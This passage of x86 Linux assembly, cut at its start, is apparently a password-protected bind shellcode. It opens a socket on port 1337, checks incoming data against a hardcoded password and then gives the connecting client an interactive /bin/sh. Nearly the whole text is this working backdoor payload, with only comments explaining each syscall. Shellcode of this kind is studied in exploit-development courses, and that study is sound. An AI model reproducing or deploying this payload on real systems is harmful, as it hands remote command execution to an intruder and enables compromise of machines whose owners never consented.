ection .text
global _start
_start:
        xor eax, eax    ; zero EAX before using it.
        xor ebx, ebx    ; zero EBX before using it.
        xor ecx, ecx    ; zero ECX before using it.
        xor edx, edx    ; zero EDX before using it.
        xor edi, edi    ; Zero EDI before using it.
        xor esi, esi    ; zero ESI before using it.

        mov al, 0x66    ; Put the sys_socketcall number into EAX.
        mov bl, 0x01    ; Put the sys_socket() call number into EBX.
        
        push esi        ; IP_PROTO      (0)
        push ebx        ; SOCK_STREAM   (1)
        push 0x02       ; AF_INET       (2)
        mov ecx, esp    ; Copy a pointer to our arguments in ECX.
                        ; ECX = *(AF_INET,SOCK_STREAM,IP_PROTO)

        int 0x80        ; Use interupt 0x80 to invoke a syscall.
        ; sys_socketcall(sys_socket,{AF_INET, SOCK_STREAM, IP_PROTO})
        
        xchg eax, edi   ; Save our socket to EDI for later usage.

        
        xor ecx, ecx     ; Zero the ECX register.

        mov al, 0x66     ; Put the sys_socketcall number into EAX.
        inc ebx          ; Increase EBX so it points to sys_bind().

        push ecx         ; Set the sin_addr value to INADDR_ANY (0)
        push word 0x3905 ; Set the sin_port value to 1337
        push bx          ; Set the sin_family value to AF_INET  (2)
        mov ecx, esp     ; Copy a pointer to the sockaddr_in struct in ECX.

        push 0x10        ; Push the size of our struct
        push ecx         ; Push our sockaddr_in struct.
        push edi         ; Push our socket file descriptor.

        mov ecx, esp     ; Copy a pointer to our arguments in ECX.
        int 0x80         ; Use interupt 0x80 to invoke a syscall.
        ; sys_socketcall(sys_bind,{socketfd, our_struct, sizeof(our_struct)})

listen:
        xor ecx, ecx    ; Zero the ECX register.
    
        mov al, 0x66    ; Put the sys_socketcall number into EAX.
        mov bl, 0x04    ; Put the sys_listen() call number into EBX.
        
        push ecx        ; Push 0 for the backlog argument.
        push edi        ; Push our socket file descriptor.

        mov ecx, esp    ; Copy a pointer to our arguments in ECX.
        int 0x80        ; Use interupt 0x80 to invoke a syscall.
        ; sys_socketcall(sys_listen,{socketfd, 0})
   xor ecx, ecx    ; Zero the ECX register.
        
        mov al, 0x66    ; Put the sys_socketcall number into EAX.
        inc ebx         ; Increase EBX so it points to sys_accept().
        push ecx        ; Set sockaddr to NULL.
        push ecx        ; Set sockaddr_len to NULL.
        push edi        ; Push our socket file descriptor.

        mov ecx, esp    ; Copy a pointer to our arguments in ECX.
        int 0x80        ; Use interupt 0x80 to invoke a syscall.
        ; sys_socketcall(sys_accept,{socketfd,0,0})

        xchg eax, esi   ; Save our client socket to ESI for later usage.
        
        
        xor ecx, ecx    ; Zero the ECX register.

        mov al, 0x66    ; Put the sys_socketcall number into EAX.
        mov bl, 0x0a    ; Put the sys_recv() call number into EBX.

        push ecx        ; NULL
        push 0x0c       ; Push the size to recv(). (12)
        push esp        ; Push the address to write our recieved data.
        push esi        ; Push our client socket file descriptor.

        mov ecx, esp    ; Copy a pointer to our arguments in ECX.
        int 0x80        ; Use interupt 0x80 to invoke a syscall.
        ; sys_socketcall(sys_recv,{client_socketfd,0,0})

        cmp dword [esp + 8],  0x31743077 ; Compare password[1-4] to 'w0t1'
        jnz listen                       ; Jump to listen if not equal
        cmp dword [esp + 12], 0x73316473 ; Compare password[5-8] to 'sd1z'
        jnz listen                       ; Jump to listen if not equal
        
        
        xor ecx, ecx    ; Zero out the ECX register, now it points to STDIN.
        mov ebx, esi    ; Copy socket file descriptor from ESI to EBX.

duploop:
        mov al, 0x3f    ; Put the sys_dup2 number into EAX.
        int 0x80        ; Use interupt 0x80 to invoke a syscall.
        inc ecx         ; Increase ECX so it points to STDOUT, STDERR.
        cmp cl, 0x03    ; Check if we are EBX is bigger than STDERR (2).
        jnz duploop     ; if not keep increasing EBX and calling dup2().
        
        ; dup2(client_sockfd, STDIN)
        ; dup2(client_sockfd, STDOUT)
        ; dup2(client_sockfd, STDERR)

        
        
        xor ecx, ecx    ; Zero out the ECX register.
        
        mov al, 0x0b    ; Put the sys_execve number into EAX.
        push ecx        ; Push NULL so we can terminate our string.
        push 0x68732f6e ; 'n/sh'
        push 0x69622f2f ; '//bi'
        mov ebx, esp    ; Copy a pointer to "//bin/sh" in EBX.
        mov edx, ecx    ; Copy NULL from ECX

        int 0x80        ; Use interupt 0x80 to invoke a syscall.
